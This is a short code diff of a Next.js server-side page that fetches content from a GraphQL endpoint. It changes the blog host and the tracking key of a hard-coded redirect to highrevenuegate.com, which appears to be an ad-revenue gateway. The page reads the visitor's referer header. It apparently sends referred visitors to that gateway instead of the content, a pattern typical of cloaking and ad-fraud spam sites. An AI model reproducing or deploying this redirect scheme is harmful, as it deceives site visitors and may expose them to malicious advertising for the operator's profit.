@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://animalpics55.blogspot.com/graphql/"
+	const endpoint = "http://pics.lovestoblog.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://www.highrevenuegate.com/uuvafbsx?key=ccff72185fcb3e78bd9b2b91cfa792c8`
+					`https://www.highrevenuegate.com/ue3c9pdix?key=c8195afa0557b7eb290ecbe6975d7cc2`
 				}`,
 			},
 		};
